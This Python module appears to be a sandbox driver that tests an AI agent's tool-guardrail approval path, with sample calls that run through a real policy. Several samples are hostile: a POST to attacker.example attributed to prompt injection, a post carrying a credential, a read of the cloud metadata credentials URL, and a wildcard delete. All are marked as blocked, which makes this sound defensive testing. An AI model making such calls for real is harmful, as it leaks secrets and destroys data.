"""A one-node graph for exercising the HIGH_RISK approval path.

The evaluation pipeline deliberately never calls a HIGH_RISK tool — a
documentation evaluator has no business deleting data or posting to webhooks.
That is the right design, and it leaves the most interesting part of the
guardrail layer with no way to reach it from the product itself.

So the approval path gets an explicit driver. It is the real registry, the real
policy and the real ``interrupt()`` cycle — only the caller is synthetic.
"""

from __future__ import annotations

from typing import Any

from langgraph.checkpoint.memory import MemorySaver
from langgraph.graph import END, START, StateGraph
from typing_extensions import TypedDict

from .config import Settings
from .samples import SYNTHETIC_CREDENTIAL
from .tools.registry import Approver, ToolRegistry, interrupt_approver

# Calls chosen to cover one of each outcome, so the sandbox demonstrates the
# whole tier ladder rather than only the dramatic end of it.
SANDBOX_CALLS: dict[str, dict[str, Any]] = {
    "Delete one cached spec (bounded — needs approval)": {
        "tool": "purge_cache",
        "args": {"pattern": "specs/petstore.json", "dry_run": True},
    },
    "Delete everything (wildcard — blocked outright)": {
        "tool": "purge_cache",
        "args": {"pattern": "*", "dry_run": True},
    },
    "POST the report to a known webhook (needs approval)": {
        "tool": "send_external_report",
        "args": {
            "webhook_url": "https://petstore3.swagger.io/hooks/report",
            "body": "Petstore API scored 100/100.",
        },
    },
    "POST a report containing a credential (blocked — exfiltration)": {
        "tool": "send_external_report",
        "args": {
            "webhook_url": "https://petstore3.swagger.io/hooks/report",
            "body": f"Auth: {SYNTHETIC_CREDENTIAL}",
        },
    },
    "POST to a destination from the document (blocked — prompt injection)": {
        "tool": "send_external_report",
        "args": {"webhook_url": "https://attacker.example/collect", "body": "Score 100/100."},
    },
    "Read the cloud metadata endpoint (blocked — SSRF)": {
        "tool": "fetch_document",
        "args": {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
    },
    "Read an allowlisted spec (allowed, no friction)": {
        "tool": "fetch_document",
        "args": {"url": "https://petstore3.swagger.io/api/v3/openapi.json"},
    },
}


class DemoState(TypedDict, total=False):
    outcome: str
    tier: str
    action: str
    detail: dict[str, Any]


def build_approval_demo_graph(
    settings: Settings,
    tool: str,
    args: dict[str, Any],
    approver: Approver = interrupt_approver,
    execute: bool = False,
):
    """Compile a graph whose single node makes one guarded call.

    ``execute=False`` swaps the tool implementation for a no-op so the sandbox
    can demonstrate an *approved* deletion or webhook POST without performing
    one. The guardrail decision is entirely unaffected — policy runs before the
    implementation is ever looked up.
    """
    registry = ToolRegistry(settings=settings, approver=approver)
    if not execute:
        registry.tools[tool] = lambda **kw: {"status": "ok", "simulated": True, "args": kw}

    def node(_state: DemoState) -> dict[str, Any]:
        result = registry.call(tool, **args)
        return {
            "outcome": "executed" if result.ok else "refused",
            "tier": result.decision.tier.value if result.decision else "?",
            "action": result.decision.action.value if result.decision else "?",
            "detail": {
                "reason": result.decision.reason if result.decision else "",
                "matched_rules": list(result.decision.matched_rules) if result.decision else [],
                "value": result.value,
                "error": result.error,
                "approved": result.event.approved if result.event else None,
            },
        }

    builder = StateGraph(DemoState)
    builder.add_node("guarded_call", node)
    builder.add_edge(START, "guarded_call")
    builder.add_edge("guarded_call", END)
    return builder.compile(checkpointer=MemorySaver())
